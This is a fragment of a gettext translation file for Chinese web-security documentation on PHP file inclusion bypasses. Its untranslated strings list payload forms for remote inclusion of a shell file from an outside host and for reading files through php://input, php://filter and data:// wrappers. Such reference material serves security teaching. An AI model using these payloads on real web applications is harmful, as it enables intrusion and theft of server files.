msgid "在php代码包含中，这种绕过方式要求php版本 < php 5.2.8"
msgstr ""

#: ../../source/vuln/fileinclude.rst:62
msgid "伪协议绕过"
msgstr ""

#: ../../source/vuln/fileinclude.rst:63
msgid ""
"远程包含: 要求 ``allow_url_fopen=On`` 且 ``allow_url_include=On`` ， payload为 "
"``?file=[http|https|ftp]://websec.wordpress.com/shell.txt`` 的形式"
msgstr ""

#: ../../source/vuln/fileinclude.rst:64
msgid ""
"PHP input: 把payload放在POST参数中作为包含的文件，要求 ``allow_url_include=On`` ，payload为"
" ``?file=php://input`` 的形式"
msgstr ""

#: ../../source/vuln/fileinclude.rst:65
msgid ""
"Base64: 使用Base64伪协议读取文件，payload为 "
"``?file=php://filter/convert.base64-encode/resource=index.php`` 的形式"
msgstr ""

#: ../../source/vuln/fileinclude.rst:66
msgid ""
"data: 使用data伪协议读取文件，payload为 "
"``?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`` 的形式，要求 "
"``allow_url_include=On``"
msgstr ""

#: ../../source/vuln/fileinclude.rst:69
msgid "协议绕过"
msgstr ""

